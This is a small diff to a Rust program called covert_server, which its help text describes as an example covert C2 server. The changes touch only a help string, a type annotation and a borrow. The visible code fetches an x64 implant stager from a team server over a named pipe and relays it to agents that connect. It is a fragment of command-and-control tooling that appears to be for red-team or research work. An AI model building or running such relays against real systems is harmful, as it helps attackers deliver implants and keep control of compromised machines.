@@ -9,7 +9,7 @@ use tokio::{
 #[clap(name = "covert_server")]
 #[clap(author = "Matthew \"Oscar\" Howard")]
 #[clap(version = "1.0")]
-#[clap(about = "Does awesome things", long_about = None)]
+#[clap(about = "Start the example covert c2 server", long_about = None)]
 struct Args {
     #[clap(long, default_value_t = String::from("localhost:2222"), value_parser)]
     ts: String,
@@ -25,7 +25,7 @@ async fn main() {
 }
 
 async fn agent_server_task() -> Result<(), Box<dyn std::error::Error>> {
-    let args = Args::parse();
+    let args: Args = Args::parse();
     let listener = TcpListener::bind(&args.bind).await?;
     println!(
         "Running...\nListening: {}\nTeam Server: {}",
@@ -47,7 +47,7 @@ async fn handle_agent_connection(
     ts_addr: &str,
 ) -> Result<(), Box<dyn std::error::Error>> {
     let (implant, mut ts_conn) =
-        covert_server::start_implant_session(ts_addr, "x64", "mypipe").await?;
+        covert_server::start_implant_session(&ts_addr, "x64", "mypipe").await?;
     agent_conn.write_frame(&implant).await?;
     println!("Got stager from ts, bytes:{}", implant.len());
     loop {
